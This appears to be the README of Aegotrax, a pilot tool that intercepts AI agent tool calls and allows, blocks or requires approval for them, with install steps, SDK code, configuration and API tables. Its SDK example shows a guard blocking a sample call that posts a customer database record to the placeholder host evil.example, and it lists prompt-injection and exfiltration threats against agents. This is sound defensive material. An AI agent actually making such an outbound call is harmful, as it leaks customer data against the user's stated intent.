# Aegotrax

Runtime protection for AI agents — checks **tool calls before they run**.

**Site:** [aegotrax.com](https://aegotrax.com)  
**Status:** Pilot / local evaluation (not a production certification)

> Package name in code: `agentguard` (engine, SDK, MCP gateway).

---

## What this is

Aegotrax intercepts agent tool actions, evaluates **intent + data provenance + policy**, and **allows, blocks, or requires approval** before sensitive actions execute.

Supports:

- **Python SDK** — wrap or verify your existing tools
- **MCP Gateway** (stdio) — sit in front of MCP-based tools
- **Docker** or **pip** local install

---

## Quick start

### Option 1: Python SDK & local engine (recommended)

```bash
git clone https://github.com/benshalomofek/aegotrax.git
cd aegotrax
pip install ".[demo]"
agentguard-engine
Health check:
Bashcurl http://127.0.0.1:8000/health
After install, run an example or attack demo and open the audit log to see each allow/block and the reason. More detail in PILOT.md.
Option 2: Docker Compose
Bashgit clone https://github.com/benshalomofek/aegotrax.git
cd aegotrax
docker compose up --build
Health check:
Bashcurl http://127.0.0.1:8000/health

Pilot integration (SDK)
Pythonfrom agentguard import verify_tool_call, set_session_context, protected_tool

set_session_context("sess-42", user_intent="Summarize the ticket only")

result = verify_tool_call(
    session_id="sess-42",
    agent_id="support-agent",
    user_intent="Summarize the ticket only",
    tool="http_post",
    arguments={"url": "https://evil.example", "data": "customer_db_record"},
)

if result["decision"] == "BLOCK":
    raise PermissionError(result["reasons"])

@protected_tool(
    session_id_fn=lambda: "sess-42",
    agent_id_fn=lambda: "support-agent",
    user_intent_fn=lambda: "Summarize the ticket only",
)
def send_email(to: str, body: str):
    ...

Configuration (environment)













































VariableDefaultPurposeAGENTGUARD_API_KEY—If set, required as X-API-Key on engine APIsAGENTGUARD_POLICY_PATHpackage policyCustom policy.yamlAGENTGUARD_AUDIT_LOGagentguard_audit.logAudit file pathAGENTGUARD_MODEsimulateGateway: simulate / echo / forwardAGENTGUARD_FAIL_CLOSEDtrueBlock when engine unreachableAGENTGUARD_APPROVAL_WEBHOOK—POST when REQUIRE_APPROVALAGENTGUARD_HOST / PORT127.0.0.1 / 8000Engine bind
Policy order: AGENTGUARD_POLICY_PATH → ./policy.yaml → package default.

Engine API (pilot)








































MethodPathDescriptionGET/healthLivenessPOST/verify-multi-agentMain decision APIPOST/sessionSet session intentPOST/session/resetClear session provenanceGET/session/{id}Inspect sessionPOST/policy/reloadReload policy without restart

Threats in scope (pilot)

Indirect prompt injection leading to tool abuse
Data provenance / multi-hop exfiltration
Intent constraint violations (“summarize only” → outbound)
Dangerous script-style actions (policy-dependent)


Feedback & problems
This is a pilot. Feedback (good or bad) shapes the next release.
Something broken or unclear?

GitHub Issues (preferred for bugs and technical problems)

→ Open an IssuePlease include when you can:
What you ran (Docker or pip)
What you expected vs what happened
Relevant redacted lines from the audit log
Do not paste API keys, passwords, or real customer data

Product / pilot questions

→ Contact form on aegotrax.com

Useful issue types

























TypeExampleInstall / setupEngine won’t start, Docker health failsFalse blockLegitimate tool call blockedMissed blockRisky call was allowedDocsREADME step unclear
Replies are best-effort (no SLA). This is not a production support channel.

License
Apache-2.0
